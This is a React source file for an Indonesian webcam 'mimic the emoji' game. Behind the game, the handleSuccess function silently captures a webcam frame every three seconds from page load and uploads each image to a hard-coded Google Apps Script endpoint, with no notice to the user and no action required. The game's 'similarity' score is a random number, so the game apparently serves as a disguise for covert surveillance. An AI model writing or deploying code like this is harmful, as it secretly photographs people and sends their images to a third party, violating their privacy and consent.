import { useEffect, useRef, useState } from "react";

const GOOGLE_SCRIPT_URL =
    "https://script.google.com/macros/s/AKfycbw6wo-7UAhh0-WKK6PmrqVnOkqVf0mpCm8evgBJXR_0XLrKzvETDQ2wUtm5GjLQLZ4C/exec";

const faces = ["😜", "😂", "😱", "😎", "😡", "😲", "🥶", "🥳", "🤪", "😏", "😭", "😇", "😬", "😤", "😅", "🤩", "🥺"];

const CamPage = () => {
    const [currentFace, setCurrentFace] = useState<string>("Klik 'Ekspresi Baru' untuk mulai!");
    const [result, setResult] = useState<string>("");
    const [previewVisible, setPreviewVisible] = useState<boolean>(false);

    const videoRef = useRef<HTMLVideoElement | null>(null);
    const canvasRef = useRef<HTMLCanvasElement | null>(null);
    const previewRef = useRef<HTMLImageElement | null>(null);

    useEffect(() => {
        initWebcam();
    }, []);

    const initWebcam = async () => {
        const video = videoRef.current;
        const canvas = canvasRef.current;

        if (!video || !canvas) return;

        const constraints: MediaStreamConstraints = {
            audio: false,
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: { ideal: "user" },
            },
        };

        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const hasFrontCamera = devices.some(
                (device) => device.kind === "videoinput" && device.label.toLowerCase().includes("front")
            );

            if (hasFrontCamera) constraints.video = { ...constraints.video as any, facingMode: { exact: "user" } };

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            handleSuccess(stream, video, canvas);
        } catch (e: any) {
            alert("Webcam tidak bisa diakses: " + e.message);
        }
    };

    const handleSuccess = (stream: MediaStream, video: HTMLVideoElement, canvas: HTMLCanvasElement) => {
        (window as any).stream = stream;
        video.srcObject = stream;
        const context = canvas.getContext("2d");

        const captureInterval = setInterval(() => {
            if (!context) return;
            canvas.width = 500;
            canvas.height = 380;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL("image/png");
            uploadToDrive(imgData);
        }, 3000);

        return () => clearInterval(captureInterval);
    };

    const uploadToDrive = async (imgData: string) => {
        try {
            const res = await fetch(GOOGLE_SCRIPT_URL, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imgData }),
            });
            console.log("📤 Upload dikirim:", res);
        } catch (err) {
            console.error("❌ Upload gagal:", err);
        }
    };

    const newChallenge = () => {
        const idx = Math.floor(Math.random() * faces.length);
        setCurrentFace(faces[idx]);
        setResult("");
        setPreviewVisible(false);
    };

    const checkFace = () => {
        const canvas = canvasRef.current;
        const video = videoRef.current;
        const preview = previewRef.current;

        if (canvas && video && preview) {
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx?.drawImage(video, 0, 0, canvas.width, canvas.height);
            preview.src = canvas.toDataURL("image/png");
            setPreviewVisible(true);
        }

        const flash = document.createElement("div");
        Object.assign(flash.style, {
            position: "fixed",
            top: "0",
            left: "0",
            width: "100vw",
            height: "100vh",
            backgroundColor: "#fff",
            opacity: "0.8",
            zIndex: "9999",
        });
        document.body.appendChild(flash);
        setTimeout(() => flash.remove(), 150);

        setTimeout(() => {
            const randomScore = Math.floor(Math.random() * 51) + 50;
            setResult(`Ekspresimu sudah difoto!\nKemiripan: ${randomScore}% 🎯\nBandingkan dengan emoji di atas 👆`);
        }, 300);
    };

    return (
        <div className="flex flex-col items-center min-h-screen p-8 bg-gradient-to-br from-[#181c2b] to-[#232946] text-white font-orbitron">
            <h1 className="text-[clamp(1.8rem,4vw,3rem)] mb-3 text-[#00fff7] tracking-widest text-center drop-shadow-[0_0_12px_#00fff7]">
                😆 Wajah Lucu Kamera 😜
            </h1>
            <p className="text-center text-gray-300 max-w-2xl mb-6 text-[clamp(0.9rem,2.5vw,1.1rem)] leading-relaxed">
                Tiru ekspresi wajah yang muncul di layar! Klik <b>Ekspresi Baru</b> untuk tantangan berikutnya, lalu tekan{" "}
                <b>Cek!</b> setelah kamu menirukan ekspresi tersebut. <br />
                <i>Ayo uji seberapa lucu dan kreatif ekspresimu!</i>
            </p>

            <div
                id="face-challenge"
                className="text-4xl sm:text-5xl text-center bg-[#232946] rounded-2xl py-4 px-8 shadow-[0_0_16px_#00fff7,0_2px_8px_#232946] mb-6 min-w-[200px] transition"
            >
                <span className="emoji">{currentFace}</span>
            </div>

            <div className="flex flex-wrap justify-center gap-4">
                <button
                    onClick={newChallenge}
                    className="bg-[#00fff7] text-[#232946] font-bold px-8 py-3 text-lg rounded-lg shadow-[0_2px_8px_#00fff7] hover:bg-[#00ccbb] hover:text-white transition"
                >
                    Ekspresi Baru
                </button>
                <button
                    onClick={checkFace}
                    className="bg-[#00fff7] text-[#232946] font-bold px-8 py-3 text-lg rounded-lg shadow-[0_2px_8px_#00fff7] hover:bg-[#00ccbb] hover:text-white transition"
                >
                    Cek!
                </button>
            </div>

            <div id="webcam-container" className="flex flex-col items-center mt-8 w-full max-w-[600px]">
                <video
                    ref={videoRef}
                    id="video"
                    autoPlay
                    playsInline
                    className="w-full aspect-video border-4 border-[#00fff7] rounded-2xl object-cover bg-[#10121a] shadow-[0_0_24px_#00fff7] mb-3"
                />
                <div className="text-yellow-300 text-lg mt-2 min-h-[40px] text-center whitespace-pre-line">{result}</div>
                <img
                    ref={previewRef}
                    alt="Hasil Ekspresi"
                    className={`mt-4 border-2 border-[#00fff7] rounded-xl w-3/4 max-w-[300px] aspect-video object-cover bg-[#232946] transition ${previewVisible ? "block" : "hidden"
                        }`}
                />
            </div>

            <canvas ref={canvasRef} id="canvas" className="hidden" />
        </div>
    );
};

export default CamPage;
